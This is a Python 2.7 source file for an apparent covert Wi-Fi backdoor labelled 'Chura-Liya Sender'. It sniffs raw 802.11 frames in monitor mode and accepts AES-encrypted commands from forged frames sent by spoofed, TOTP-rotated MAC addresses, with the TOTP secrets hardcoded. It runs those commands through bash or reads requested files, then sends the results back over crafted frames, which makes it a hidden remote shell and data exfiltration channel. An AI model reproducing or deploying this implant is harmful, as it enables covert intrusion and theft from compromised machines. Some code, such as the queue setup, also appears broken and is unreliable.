#!/usr/bin/python2.7

from Queue import Queue,Empty
from threading import Thread,Lock
from subprocess import Popen, PIPE
import zlib
import base64
from Crypto.Cipher import AES
from Crypto import Random
import subprocess
import logging
import time
import base64
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse
import hashlib
from binascii import unhexlify,hexlify
from struct import pack
from struct import unpack
import pyotp
import datetime
from random import randint
import os

MTU=1341

global recv
recv=0

global SC
SC=0
global allowed_addr1
global allowed_addr2
global addr1
global addr2
allowed_addr1=[]
allowed_addr2=[]
mutex = Lock()

def lzpad(msg):
    while (len(msg)<4):
        msg="0"+msg
    return msg

def raw2pkt(msg):
    length = len(msg)
    pkts = length / MTU
    rem = length % MTU
    if (rem>0):
        pkts+=1
    parts=[msg[i:i+MTU] for i in range(0, len(msg), MTU)]
    i=0
    while (i<len(parts)):
        parts[i]=unhexlify(lzpad(hex(i+1).replace('0x','')))+unhexlify(lzpad(hex(pkts).replace('0x','')))+parts[i]
        i+=1
    print parts
    return parts

def pkt2raw(p):
    load = p[4:]
    seq = int(unhexlify(p[:2]),16)
    size = int(unhexlify(p[2:4]),16)
    return seq,size,load

def load_mac_prefixes(file):
    f = open(file,'r')
    data = f.readlines()
    f.close()
    i=0
    macs=[]
    for line in data:
        da=line.split(' ')
        mac=da[0].strip()
        vendor=da[1].strip()
        n=2
        mac_parts=[mac[i:i+n] for i in range(0, len(mac), n)]
        mac=':'.join(mac_parts)
        macs.append((mac.lower(),vendor))
    return macs


def random_hex_n(n):
    return hexlify(Random.new().read(n))

def xor_strings(xs, ys):
    return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

def pick_mac(n,macs):
    nhex=hex(int(n)).replace('0x','')
    index = int(n) & len(macs)-1
    mac,vendor = macs[index]
    existing='0123456789abcdef'
    suffix=nhex
    while (len(suffix)!=6):
        i=int(nhex,16) & len(existing)-1
        suffix=existing[i]+suffix
    suffix_parts=[suffix[i:i+2] for i in range(0,len(suffix),2)]
    suffix = ':'.join(suffix_parts)
    return (mac.lower()+":"+suffix,vendor)

def accepted_addrs(totp,timestamp,macs):
    now=timestamp
    past=now - datetime.timedelta(seconds=30)
    future=now + datetime.timedelta(seconds=30)
    n1=totp.generate_otp(totp.timecode(now))
    n2=totp.generate_otp(totp.timecode(past))
    n3=totp.generate_otp(totp.timecode(future))
    mac1=pick_mac(n1,macs)
    mac2=pick_mac(n2,macs)
    mac3=pick_mac(n3,macs)
    return [mac1,mac2,mac3]


def updateTOTP():
    s1="LOZHALKGVYVCTTEYCPAZCSZYX5N643LMUVQZGDQSAM2WKX4QN3VR4XDWEEFKNIBX"
    s2="SR3P2RLHYPH2L7CA3PGETDKYWYIVTUBW7YOATMWPOH6VVBVXBXG2BIQTKNU5GQGP"
    print s1
    print s2
    cmacsfile="clientmacs"
    smacsfile="servermacs"
    clientmacs=load_mac_prefixes(cmacsfile)
    servermacs=load_mac_prefixes(smacsfile)
    while 1:
        global allowed_addr1
        global allowed_addr2
        global addr1
        global addr2
        totp1 = pyotp.TOTP(s1)
        n1=totp1.now()
        totp2 = pyotp.TOTP(s2)
        n2=totp2.now()
        now=datetime.datetime.now() - datetime.timedelta(days=30)
        t1=totp1.generate_otp(totp1.timecode(now))
        t2=totp2.generate_otp(totp2.timecode(now))
        this_addr1=accepted_addrs(totp1,datetime.datetime.now(),clientmacs)
        this_addr2=accepted_addrs(totp2,datetime.datetime.now(),servermacs)
        a1,vendor=pick_mac(t1,clientmacs)
        a2,vendor=pick_mac(t2,servermacs)
        i=0
        while (i<len(this_addr1)):
            mac,vendor=this_addr1[i]
            this_addr1[i]=mac
            i+=1
        i=0
        while (i<len(this_addr2)):
            mac,vendor=this_addr2[i]
            this_addr2[i]=mac
            i+=1
        if (set(this_addr1)!=set(allowed_addr1) and set(this_addr2)!=set(allowed_addr2)):
            print "[*] OTP1:",n1
            print "[*] OTP2:",n2
            print "[*] Accepted ADDR1s:",this_addr1
            print "[*] Accepted ADDR2s:",this_addr2
            print "[*] Server ADDRs:",a1,a2
            mutex.acquire()
            allowed_addr1=this_addr1
            allowed_addr2=this_addr2
            addr1=a1
            addr2=a2
            mutex.release()
        time.sleep(1)

def endSwap(value):
    """Takes an object and reverse Endians the bytes

    Useful for crc32 within 802.11:
    Autodetection logic built in for the following situations:
    Will take the stryng '0xaabbccdd' and return string '0xddccbbaa'
    Will take the integer 12345 and return integer 14640
    Will take the bytestream string of 'aabbccdd' and return string 'ddccbbaa'
    """
    try:
        value = hex(value).replace('0x', '')
        sType = 'int'
    except Exception, e:
        if '0x' in value:
            sType = 'hStr'
        else:
            sType = 'bStr'
        value = value.replace('0x', '')
#        raise e
    start = 0
    end = 2
    swapList = []
    for i in range(len(value)/2):
        swapList.append(value[start:end])
        start += 2
        end += 2
    swapList.reverse()
    s = ''
    for i in swapList:
        s += i
    
    if sType == 'int':
        s = int(s, 16)
    elif sType == 'hStr':
        s = '0x' + s
    return s


## Launcher options
parser = argparse.ArgumentParser(description='Chura-Liya Sender', prog='sender.py', usage='%(prog)s <Monitor Mode WiFi NIC> <Desired Password>')
parser.add_argument('Interface', type=str, help='WiFi NIC')
parser.add_argument('Password', type=str, help='Desired Password')
args = parser.parse_args()

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[:-ord(s[len(s)-1:])]
global addr1
global addr2
class AESCipher:
    def __init__( self, key ):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return iv + cipher.encrypt( raw )

    def decrypt( self, enc ):
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))


def convert(pkt_hex):
    last_4 = unpack('!I',pkt_hex[-4:])[0]
    # getting last 4 bytes and converting it to integer

    rest = pkt_hex[:-4]
    # getting whole packet in string except last 4 bytes

    new_hex_pkt = rest + pack('>I',(last_4+1))
    # created the whole packet again with last 4 bytes incremented by 1
    # the new string is like '\x00\x04\x00 ... ... \x06k' <--- NOTE: 'j' was incremented to 'k' (rather than ']' to '^')

    return IP(new_hex_pkt) # <--- NOTE: rebuild the packet and recalculate its checksum

# extractSN/calculateSC from https://www.coresecurity.com/system/files/publications/2016/05/psdos.py_.txt
# Copyright (c) 2009 Core Security Technologies
# Author: Leandro Meiners (lea@coresecurity.com)

def extractSN(sc):
    hexSC = '0' * (4 - len(hex(sc)[2:])) + hex(sc)[2:] # "normalize" to four digit hexadecimal number
    sn = int(hexSC[:-1], 16)
    return sn

def calculateSC(sn, fgnum = 0):
    if (fgnum > MAX_FGNUM): fgnum = 0
    if (sn > MAX_SN): sn = 0
    hexSN = hex(sn)[2:] + hex(fgnum)[2:]
    SC = int(hexSN, 16)
    return SC

def build_rts(addr1,addr2):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=11L, type=1L, addr1=addr1, addr2=addr2)
    return p/dot11

def build_cts(addr1):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=12L, type=1L, addr1=addr1)
    return p/dot11


def build_block_ack(addr1,addr2,seq):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=13L, type=1L, addr1=addr2)
    raw = Raw(load=unhexlify(addr1.replace(':',''))+unhexlify('0500')+unhexlify('0000')+unhexlify("ffffffffffffffff"))
    return p/dot11/raw

def build_ack(addr1):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=13L, type=1L, addr1=addr1)
    return p/dot11


def build_pkt(addr1,addr2,msg,retry=False):
    print "[*] Building pkt; addr1:",addr1,"/ addr2:",addr2
    rates = aes.encrypt(msg)
    mode="00"
    payload=rates
    p = RadioTap('\x00\x00$\x00/@\x00\xa0 \x08\x00\x00\x00\x00\x00\x00\x89\xf7\xaf\x1f\x9a\x00\x00\x00\x10\x02l\t\xa0\x00\xa5\x00\x00\x00\xa5\x00')
    dot11 = Dot11(subtype=8L, type=2L, FCfield=65L,addr1=addr1,addr2=addr2,addr3=addr1)

    ### Prolly can leave off icv at this point, but for now, leaving...
    dot11wep = Dot11WEP(iv=str(os.urandom(3)),keyid=32,wepdata=payload)
    p = p/dot11/Dot11QoS("\x00\x00")/dot11wep
    if (not retry):
        global sn
        sn = (sn + 1) % MAX_SN
    sc = calculateSC(sn)        # our frame is not fragmented (i.e. fgnum = 0)
    p[Dot11].SC=sc

    ### Heres the FCS kung-fu for WPA
    del p[Dot11WEP].icv
    try:
        pktstr=str(p[Dot11])
        try:
            hex_crc=hex(crc32(pktstr) & 0xffffffff).lstrip('0x').rstrip('L')
            while (len(str(hex_crc))!=8):
                hex_crc='0'+hex_crc
            try:
                crc_bigend = endSwap(hex_crc)
                try:
                    p = p/Padding(load = unhexlify(crc_bigend))
                except Exception, e:
                    print "unhexlify():",str(e)
            except Exception, e:
                print "endswap():",str(e)
        except Exception, e:
            print "hex_crc:",str(e)
    except Exception, e:
        print "pktstr:",str(e)
        raise e
    return p

def s1p(cmd):
    global w4cts,rcts,recv,w4ack
    pkt=SendRates(cmd)
    mutex.acquire()
    w4ack=1
    mutex.release()
    sendp(pkt,iface=conf.iface,verbose=0)
    retry=3
    timeout=3
    t=0
    while (w4ack == 1):
        if retry == 0:
            break
        if (t==timeout):
            retry-=1
            t=0
            pkt=SendRates(cmd,retry=1)
            sendp(pkt,iface=conf.iface,verbose=0)
            print "[*] Resending.."
        time.sleep(0.1)
        t+=0.5


interface=args.Interface
password=args.Password
aes=AESCipher(password)
conf.iface=interface
addr1="a4:71:74:10:1f:29".lower()
addr2="24:5B:A7:52:1E:DE".lower()

def wait_cts(pkt):
    if pkt.haslayer(Dot11):
        if pkt[Dot11].type == 1 and pkt[Dot11].subtype == 12: # if management frame and beacon and SSID is blank
            if pkt.addr1 == addr2:
                print "[*] Got CTS"
                print pkt.addr1
                return True

def wifishell(args):
    p = Popen(['/bin/bash', '-c',args], stdin=PIPE, stdout=PIPE, stderr=PIPE)
    output, err = p.communicate()
    return output+err

def SendRates(cmd,retry=False):
    if (len(cmd)>1434):
        frames = sendlong(cmd)
        return frames
    frame = build_pkt(addr2,addr1,cmd,retry)
    return frame


def packets(pkt):
    global rts
    global recv
    global rcts
    global w4ack
    global w4cts
    if pkt.haslayer(Dot11):
        if (w4ack):
            if pkt[Dot11].type == 1 and pkt[Dot11].subtype == 13 and pkt.addr1 in allowed_addr1: # if ACK
                print "[*] Got ACK"
                mutex.acquire()
                w4ack=0
                mutex.release()
        if pkt.addr1 in allowed_addr1 and pkt.addr2 in allowed_addr2:
            if pkt[Dot11].type == 1 and pkt[Dot11].subtype == 11: # if RTS
                pkt = build_cts(addr2)
                time.sleep(.5)
                sendp(pkt,iface="wlan1mon",verbose=1,count=1)
                return True
            if pkt.haslayer(Dot11WEP):
                if pkt[Dot11].type == 2 and pkt[Dot11].subtype == 8: # if management frame and beacon and SSID is blank
                    payload=pkt[Dot11WEP].wepdata
                    try:
                        decrypted = aes.decrypt(payload)
                    except ValueError:
                        try:
                            decrypted = aes.decrypt(payload[:-4])
                        except:
                            return True
                    ack = build_ack(addr2)
                    print "Sending ACK"
                    sendp(ack,iface=conf.iface)
                    cmd_response=""
                    if (decrypted.startswith("download")):
                        filename = decrypted.split("download")[1].strip()
                        try:
                            f = open(filename,'r')
                            cmd_response = f.read()
                            f.close()
                        except Exception, e:
                            cmd_response=str(e)
                    else:
                        cmd_response = str(wifishell(decrypted))
                    pkts = raw2pkt(cmd_response)
                    for pkt in pkts:
                        s1p(pkt)
                    return True 

def hs(q):
    sniff(iface=interface,prn=lambda x: q.put(x),store=0)


def process(q):
    while(True):
        try:
            pkt = q.get(timeout=1)
            packets(pkt)
            q.task_done()
        except Empty:
            pass


totp_t = Thread(target=updateTOTP)
totp_t.daemon = True
totp_t.start()

q = Queue.Queue()
sniffer = Thread(target=hs,args=(q,))
sniffer.daemon = True
sniffer.start()
proc = Thread(target=process,args=(q,))
proc.daemon = True
proc.start()

global sn
MAX_SN=4096
MAX_FGNUM=16
sn = random.randint(0,4095)
fgnum = 0
global w4ack
w4ack=0
global rts
rts=0
global w4cts
w4cts=False
global rcts
rcts=False

print "\nSniffing for packets on",addr1,"and",addr2
while 1:
    try:
        packets(q.get())
        q.task_done()
    except KeyboardInterrupt:
        exit()
